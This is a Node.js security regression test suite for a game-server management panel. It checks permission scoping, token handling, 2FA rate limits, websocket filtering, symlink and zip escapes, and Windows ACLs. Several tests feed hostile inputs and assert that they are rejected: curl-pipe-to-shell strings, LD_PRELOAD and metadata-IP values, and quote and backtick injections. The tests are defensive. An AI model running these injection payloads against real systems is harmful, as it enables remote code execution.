'use strict';

/**
 * Security regressions: each test pins one hole that was found and closed.
 * Runs a real API (routes, auth, manager) on a throwaway data folder.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const { execFileSync } = require('child_process');

process.env.GP_DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'gp-security-'));

const { config } = require('../../server/core/config');
const { Store } = require('../../server/core/store');
const { Auth } = require('../../server/core/auth');
const { WebSocketServer } = require('../../server/core/ws');
const { TemplateRegistry } = require('../../server/games/templates');
const { ServerManager } = require('../../server/servers/manager');
const { Scheduler } = require('../../server/features/scheduler');
const { createApi } = require('../../server/api');
const { HttpError } = require('../../server/core/util');
const { scopeBroadcast, sameOrigin } = require('../../server/api/helpers');
const { checkPatch } = require('../../server/servers/untrusted');
const files = require('../../server/features/files');
const { icaclsCommands } = require('../../server/core/acl');

const store = new Store(config.stateFile);
const auth = new Auth(store, 'x'.repeat(48));
const wss = new WebSocketServer();
const templates = new TemplateRegistry();
const manager = new ServerManager(store, templates, wss);
const scheduler = new Scheduler(manager, store);
const api = createApi({ store, auth, manager, templates, scheduler, hostMetrics: {}, notifier: {}, bridge: { forgetServer() {} } });

const serverDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gp-security-srv-'));
const custom = {
  id: 'custom1',
  name: 'Custom',
  templateId: 'custom-command',
  platform: 'linux',
  dir: serverDir,
  ports: { game: 27015, extra: 27016 },
  vars: { INSTALL_SCRIPT: 'echo hi', LAUNCH_COMMAND: './start.sh', STOP_COMMAND: '', QUERY_TYPE: 'none', RCON_PASSWORD: 'hunter22secret' },
  schedules: [],
  memory: 1024,
};
const other = { ...custom, id: 'other1', name: 'Other', vars: { RCON_PASSWORD: 'otherpassword' }, schedules: [] };
manager.servers.push(custom, other);

const admin = auth.createUser({ username: 'boss', password: 'correct horse battery', role: 'admin' });
const sub = auth.createUser({ username: 'helper', password: 'another long passphrase', role: 'user', servers: ['custom1'], permissions: ['settings', 'schedules', 'console'] });
const subRecord = auth.users.find((u) => u.id === sub.id);
const tokenOf = (username, password) => auth.login(username, password, '10.0.0.1').token;
const subToken = tokenOf('helper', 'another long passphrase');

let base;
const httpServer = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  try {
    await api.handle(req, res, url);
  } catch (err) {
    if (res.writableEnded) return;
    res.writeHead(err instanceof HttpError ? err.code : 500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: err.message }));
  }
});

test.before(() => new Promise((resolve) => httpServer.listen(0, '127.0.0.1', () => resolve((base = `http://127.0.0.1:${httpServer.address().port}`)))));
test.after(() => {
  httpServer.close();
  store.saveNow();
  fs.rmSync(config.dataDir, { recursive: true, force: true });
  fs.rmSync(serverDir, { recursive: true, force: true });
});

const call = (method, url, { token = subToken, body, headers = {} } = {}) =>
  fetch(base + url, { method, headers: { ...(token ? { Authorization: `Bearer ${token}` } : {}), ...(body ? { 'Content-Type': 'application/json' } : {}), ...headers }, body: body ? JSON.stringify(body) : undefined });

/* ------------------------------------------- sub-user settings: no shell -- */

test('a sub-user cannot put a shell command into the server name or a launch variable', async () => {
  for (const body of [{ name: 'x $(curl evil.sh | sh)' }, { vars: { LAUNCH_COMMAND: 'bash -c "curl evil | sh"' } }, { vars: { LD_PRELOAD: '/tmp/evil.so' } }, { ip: '169.254.169.254' }, { startCommand: 'sh evil.sh' }]) {
    const res = await call('PATCH', '/api/servers/custom1', { body });
    assert.ok([400, 403].includes(res.status), `${JSON.stringify(body)} gave ${res.status}`);
  }
  assert.strictEqual(custom.name, 'Custom');
  assert.strictEqual(custom.vars.LAUNCH_COMMAND, './start.sh');
  assert.strictEqual(custom.vars.LD_PRELOAD, undefined);
});

test('a sub-user can still save ordinary settings, and a form that echoes every value back', async () => {
  const res = await call('PATCH', '/api/servers/custom1', { body: { name: "Bob's server (beta)", vars: { ...custom.vars, QUERY_TYPE: 'a2s' }, maxPlayers: 12 } });
  assert.strictEqual(res.status, 200, await res.text());
  assert.strictEqual(custom.name, "Bob's server (beta)");
  assert.strictEqual(custom.vars.QUERY_TYPE, 'a2s');
});

test('variable values are checked against the template', () => {
  const tpl = { startCommand: './run -name "{{SERVER_NAME}}"', variables: [{ name: 'SERVER_NAME' }, { name: 'MODE', options: ['a', 'b'] }, { name: 'SLOTS', type: 'number' }] };
  const server = { vars: { SERVER_NAME: 'x' } };
  assert.throws(() => checkPatch(tpl, { vars: { SERVER_NAME: 'a" ; reboot ; "' } }, server), /cannot contain/);
  assert.throws(() => checkPatch(tpl, { vars: { SERVER_NAME: 'a`id`' } }, server), /cannot contain/);
  assert.throws(() => checkPatch(tpl, { vars: { MODE: 'c' } }, server), /one of/);
  assert.throws(() => checkPatch(tpl, { vars: { SLOTS: 'many' } }, server), /number/);
  assert.doesNotThrow(() => checkPatch(tpl, { vars: { SERVER_NAME: 'My server! #1', MODE: 'b', SLOTS: '8' } }, server));
  // A variable used as the command itself is code, whatever it is called.
  assert.throws(() => checkPatch({ startCommand: '{{RUNNER}} -x', variables: [{ name: 'RUNNER' }] }, { vars: { RUNNER: 'java' } }, {}), /administrators/);
});

/* --------------------------------------------- schedules need the action -- */

test('a sub-user without "command" cannot turn a schedule into a console command', async () => {
  const created = await call('POST', '/api/servers/custom1/schedules', { body: { name: 'Nightly', cron: '0 5 * * *', action: 'backup' } });
  assert.strictEqual(created.status, 403, 'backup needs the backups permission');
  // An admin made a harmless one; the sub-user edits it.
  const schedule = scheduler.add(custom, { name: 'Restart', cron: '0 5 * * *', action: 'restart' });
  subRecord.permissions.push('power');
  const res = await call('PATCH', `/api/servers/custom1/schedules/${schedule.id}`, { body: { action: 'command', command: 'op attacker' } });
  assert.strictEqual(res.status, 403);
  assert.strictEqual(custom.schedules.find((s) => s.id === schedule.id).action, 'restart');
  const ok = await call('PATCH', `/api/servers/custom1/schedules/${schedule.id}`, { body: { cron: '0 6 * * *' } });
  assert.strictEqual(ok.status, 200);
});

/* ---------------------------------------------------- tokens and keys -- */

test('a session token in the query string is not accepted', async () => {
  const res = await call('GET', `/api/auth/me?token=${encodeURIComponent(subToken)}`, { token: null });
  assert.strictEqual(res.status, 401);
});

test('an API key cannot create accounts through a server Access tab', async () => {
  const { key } = auth.createScriptKey(admin.id, { name: 'bot' });
  const res = await call('POST', '/api/servers/custom1/access', { token: key, body: { username: 'sneaky', password: 'a very long password', permissions: ['console'] } });
  assert.strictEqual(res.status, 401);
  assert.ok(!auth.findByUsername('sneaky'));
});

test('two-factor codes are limited per account, not only per address', () => {
  const user = auth.users.find((u) => u.id === admin.id);
  user.totp = { secret: require('../../server/core/totp').generateSecret(), lastStep: -1, recovery: [] };
  let locked = false;
  for (let i = 0; i < 12 && !locked; i++) {
    const { ticket } = auth.login('boss', 'correct horse battery', `10.1.0.${i}`);
    try {
      auth.loginSecondFactor(ticket, '000000', `10.2.0.${i}`);
    } catch (err) {
      locked = err.code === 429;
    }
  }
  delete user.totp;
  auth.failures.clear();
  assert.ok(locked, 'guesses from fresh addresses never hit a limit');
});

/* --------------------------------------------------------- websockets -- */

test('broadcasts only reach accounts that can see the server, without its passwords', () => {
  const conn = { user: subRecord, epoch: subRecord.sessionEpoch || 0, close() {} };
  const all = { servers: [manager.publicServer(custom), manager.publicServer(other)] };
  const seen = scopeBroadcast(auth, conn, 'servers', all);
  assert.deepStrictEqual(seen.servers.map((s) => s.id), ['custom1']);
  assert.strictEqual(scopeBroadcast(auth, conn, 'console:other1', { type: 'lines', serverId: 'other1', lines: [] }), null);
  assert.strictEqual(scopeBroadcast(auth, conn, 'server:status', { serverId: 'other1', status: 'running' }), null);

  // Without "settings" on the server the RCON password stays out.
  const { id } = auth.createUser({ username: 'viewer', password: 'just looking here', servers: ['custom1'], permissions: ['console'] });
  const viewer = auth.users.find((u) => u.id === id);
  const view = scopeBroadcast(auth, { user: viewer, epoch: 0, close() {} }, 'servers', all);
  assert.strictEqual(view.servers[0].vars.RCON_PASSWORD, undefined);
});

test('a socket stops receiving once its sessions are revoked', () => {
  let closed = false;
  const conn = { user: subRecord, epoch: subRecord.sessionEpoch || 0, close: () => (closed = true) };
  auth.revokeSessions(subRecord.id);
  assert.strictEqual(scopeBroadcast(auth, conn, 'servers', { servers: [] }), null);
  assert.ok(closed);
});

test('cross-site pages are refused, the panel itself and scripts are not', () => {
  assert.strictEqual(sameOrigin({ headers: { host: 'panel:8420', origin: 'http://panel:8100' } }), false);
  assert.strictEqual(sameOrigin({ headers: { host: 'panel:8420', origin: 'http://panel:8420' } }), true);
  assert.strictEqual(sameOrigin({ headers: { host: 'panel:8420' } }), true);
});

/* --------------------------------------------------------- file manager -- */

test('a write cannot follow a dangling symlink out of the server folder', { skip: process.platform === 'win32' }, async () => {
  const outside = path.join(os.tmpdir(), `gp-escape-${Date.now()}`);
  fs.symlinkSync(outside, path.join(serverDir, 'trap'));
  await assert.rejects(files.write(serverDir, 'trap', 'owned'), /symlink/);
  assert.ok(!fs.existsSync(outside));
});

test('a zip that carries a symlink is not unpacked', { skip: process.platform === 'win32' }, async (t) => {
  try {
    execFileSync('zip', ['-v'], { stdio: 'ignore' });
    execFileSync('unzip', ['-v'], { stdio: 'ignore' });
  } catch {
    t.skip('zip/unzip not installed');
    return;
  }
  const work = fs.mkdtempSync(path.join(os.tmpdir(), 'gp-zip-'));
  fs.symlinkSync('/etc', path.join(work, 'etc-link'));
  execFileSync('zip', ['-qy', path.join(serverDir, 'evil.zip'), 'etc-link'], { cwd: work });
  fs.rmSync(work, { recursive: true, force: true });
  await assert.rejects(files.extract(serverDir, 'evil.zip'), /symlink/);
  assert.ok(!fs.existsSync(path.join(serverDir, 'etc-link')));
});

/* ---------------------------------------------------- Windows data ACLs -- */

test('the Windows data folder keeps secrets to SYSTEM and Administrators', () => {
  const commands = icaclsCommands('C:\\ProgramData\\GamePanel');
  const secret = commands.find((c) => c.target.endsWith('secret.key') && c.args.includes('/grant:r'));
  assert.ok(secret.args.includes('/inheritance:r'));
  assert.ok(!secret.args.some((a) => a.startsWith('*S-1-5-32-545')), 'Users must not keep access to the session key');
  const tools = commands.find((c) => c.target.endsWith('tools') && c.args.includes('/grant:r'));
  assert.ok(tools.args.includes('*S-1-5-32-545:(OI)(CI)RX'), 'others may run tools, not change them');
});
